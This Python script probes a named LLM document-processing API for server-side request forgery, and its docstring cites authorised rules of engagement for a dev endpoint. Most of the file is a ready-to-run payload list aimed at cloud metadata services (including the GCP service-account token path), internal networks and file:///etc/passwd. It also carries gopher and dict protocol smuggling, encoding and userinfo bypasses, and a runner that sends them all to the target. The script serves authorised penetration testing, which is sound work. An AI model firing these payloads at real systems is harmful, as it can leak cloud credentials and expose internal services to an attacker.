#!/usr/bin/env python3
"""SSRF probe for Lazarus AI LLM document processing API.

Targets: api-dev.gcp.lzrops.com/api/engine/internal via input.file.url
Vector:  The API fetches remote PDF URLs server-side before passing content
         to the LLM. SSRF enables internal network scanning, cloud metadata
         exfiltration, and protocol smuggling.

ROE: Amendment 04, Section 3.4 — Authorized on dev API only.
"""

from __future__ import annotations

import argparse
import sys
from pathlib import Path
from typing import Any

from fuzz_utils import run_probe_iterations


def build_ssrf_payloads() -> list[tuple[str, str, dict[str, Any] | None]]:
    """Build SSRF probe payloads.

    Returns list of (prompt, file_url, extra_settings) tuples.
    """
    base_prompt = "Describe the contents of this document in detail."

    # Targets for SSRF probing
    urls = [
        # Cloud metadata services (GCP is the target platform)
        ("gcp_metadata", "http://169.254.169.254/computeMetadata/v1/"),
        ("gcp_metadata_project", "http://metadata.google.internal/computeMetadata/v1/project/project-id"),
        ("gcp_metadata_hostname", "http://metadata.google.internal/computeMetadata/v1/instance/hostname"),
        ("gcp_metadata_token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
        ("aws_metadata", "http://169.254.169.254/latest/meta-data/"),
        ("aws_userdata", "http://169.254.169.254/latest/user-data"),
        ("azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),

        # Localhost / internal network reconnaissance
        ("localhost_http", "http://127.0.0.1/"),
        ("localhost_alt", "http://localhost:8080/"),
        ("localhost_admin", "http://127.0.0.1:8000/admin"),
        ("internal_10", "http://10.0.0.1/"),
        ("internal_172", "http://172.16.0.1/"),
        ("internal_192", "http://192.168.0.1/"),

        # Protocol smuggling
        ("file_proto", "file:///etc/passwd"),
        ("file_etc_hosts", "file:///etc/hosts"),
        ("ftp_local", "ftp://127.0.0.1/"),
        ("dict_local", "dict://127.0.0.1:11211/stat"),
        ("gopher_local", "gopher://127.0.0.1:9000/"),

        # DNS rebinding / redirect chaining
        ("redirect_chain", "http://1.1.1.1/"),  # cloudflare — test if redirects followed
        ("dns_rebind", "http://0.0.0.0/"),

        # HTTP parameter pollution on URL
        ("url_param_pollution", "http://example.com?next=http://169.254.169.254/"),

        # URL encoding bypass
        ("url_encoded_localhost", "http://%31%32%37%2e%30%2e%30%2e%31/"),  # 127.0.0.1 encoded

        # IPv6 localhost variants
        ("ipv6_localhost", "http://[::1]/"),
        ("ipv6_mapped", "http://[::ffff:127.0.0.1]/"),

        # Abusing URL fragments / credentials
        ("userinfo_bypass", "http://evil@127.0.0.1:80@169.254.169.254/"),
    ]

    payloads: list[tuple[str, str, dict[str, Any] | None]] = []
    for name, url in urls:
        prompt = f"{base_prompt} [probe={name}]"
        payloads.append((prompt, url, None))

    return payloads


def main():
    parser = argparse.ArgumentParser(description="SSRF probe for Lazarus LLM API")
    parser.add_argument(
        "--endpoint",
        default="https://api-dev.gcp.lzrops.com/api/engine/internal",
        help="Target API endpoint",
    )
    parser.add_argument("--authkey", required=True)
    parser.add_argument("--orgid", required=True)
    parser.add_argument(
        "--output-dir",
        type=Path,
        default=Path("results/fuzz"),
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=2.0,
        help="Seconds between requests",
    )
    args = parser.parse_args()

    payloads = build_ssrf_payloads()
    print(f"[SSRF] Running {len(payloads)} SSRF probes against {args.endpoint}")

    session = run_probe_iterations(
        probe_name="ssrf",
        endpoint=args.endpoint,
        authkey=args.authkey,
        orgid=args.orgid,
        payloads=payloads,
        delay=args.delay,
        output_dir=args.output_dir,
    )

    print(f"\n[SSRF] Complete: {len(session.iterations)} iterations, {len(session.findings)} findings")
    for f in session.findings:
        print(f"  ! {f}")

    if session.findings:
        sys.exit(2)
    sys.exit(0)


if __name__ == "__main__":
    main()
